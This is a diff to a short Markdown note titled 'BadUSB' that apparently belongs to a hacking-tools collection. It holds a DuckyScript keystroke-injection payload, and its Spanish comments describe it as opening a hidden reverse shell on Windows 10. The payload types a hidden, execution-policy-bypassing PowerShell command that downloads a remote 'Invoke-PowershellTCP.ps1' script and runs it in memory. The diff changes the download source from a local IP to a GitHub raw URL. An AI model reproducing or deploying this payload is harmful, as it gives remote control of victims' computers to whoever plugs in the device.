@@ -1,5 +1,7 @@
 # BadUSB
 
+* [Flipper-Tools](https://github.com/UberGuidoZ/Flipper)
+
 ```bash 
 REM Description: Abrir powershell y crea una reverse shell oculta
 REM Target: Windows 10 (CMD, Powershell)
@@ -10,6 +12,6 @@ REM --> Utilizando IEX para realizar un GET por medio de la memoria comunicarse 
 DELAY 300
 GUI r
 DELAY 20
-STRING powershell -w h -NoP -NonI -Ep Bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.11.11/Invoke-Spartan.txt');
+STRING powershell -w h -NoP -NonI -Ep Bypass IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1');
 ENTER
 ```
